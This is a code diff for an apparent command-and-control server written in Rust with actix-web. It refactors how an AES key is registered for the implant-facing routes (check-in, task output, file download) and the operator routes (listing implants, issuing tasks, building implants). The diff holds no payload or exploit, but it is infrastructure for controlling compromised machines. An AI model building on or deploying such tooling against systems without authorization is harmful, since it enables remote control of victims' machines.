@@ -1,7 +1,7 @@
 pub mod crypto;
 pub mod routes;
 
-use actix_web::web;
+use actix_web::{web, HttpRequest};
 use bcrypt::{hash, DEFAULT_COST};
 use base64::Engine as _;
 use openssl::rand::rand_bytes;
@@ -115,22 +115,50 @@ pub fn init_database(database_path: &Path, users: &[User]) -> io::Result<Arc<Mut
     Ok(db)
 }
 
+/// Per-app AES key material. Tests register this in app data so parallel tests do not race on `AES_KEY`.
+#[derive(Clone)]
+pub struct AesKey(pub String);
+
+impl AesKey {
+    pub fn from_request(req: &HttpRequest) -> Option<String> {
+        req.app_data::<web::Data<AesKey>>()
+            .map(|k| k.0.clone())
+            .or_else(|| std::env::var("AES_KEY").ok())
+    }
+}
+
+fn register_aes_key(cfg: &mut web::ServiceConfig, aes_key_b64: Option<String>) {
+    if let Some(key) = aes_key_b64 {
+        cfg.app_data(web::Data::new(AesKey(key)));
+    }
+}
+
 /// Register implant-facing routes (plain HTTP in tests; production wraps these in TLS in `main`).
-pub fn configure_implant_routes(cfg: &mut web::ServiceConfig, db: Arc<Mutex<Connection>>) {
+pub fn configure_implant_routes(
+    cfg: &mut web::ServiceConfig,
+    db: Arc<Mutex<Connection>>,
+    aes_key_b64: Option<String>,
+) {
     use actix_web::web::Data;
-    cfg.app_data(Data::new(db))
-        .route("/js", web::post().to(routes::check_in))
+    cfg.app_data(Data::new(db));
+    register_aes_key(cfg, aes_key_b64);
+    cfg.route("/js", web::post().to(routes::check_in))
         .route("/index", web::post().to(routes::index))
         .route("/return_out", web::post().to(routes::return_out))
         .route("/download", web::get().to(routes::download_file));
 }
 
 /// Register operator-facing routes (plain HTTP in tests).
-pub fn configure_conduit_routes(cfg: &mut web::ServiceConfig, db: Arc<Mutex<Connection>>) {
+pub fn configure_conduit_routes(
+    cfg: &mut web::ServiceConfig,
+    db: Arc<Mutex<Connection>>,
+    aes_key_b64: Option<String>,
+) {
     use actix_web::web::Data;
     cfg.app_data(Data::new(db.clone()))
-        .app_data(web::PayloadConfig::new(10 * 1024 * 1024))
-        .route("/imps", web::get().to(routes::get_connected_imps))
+        .app_data(web::PayloadConfig::new(10 * 1024 * 1024));
+    register_aes_key(cfg, aes_key_b64);
+    cfg.route("/imps", web::get().to(routes::get_connected_imps))
         .route("/issue_task", web::post().to(routes::issue_task))
         .route("/authenticate", web::post().to(routes::authenticate))
         .route("/build_imp", web::post().to(routes::build_imp))
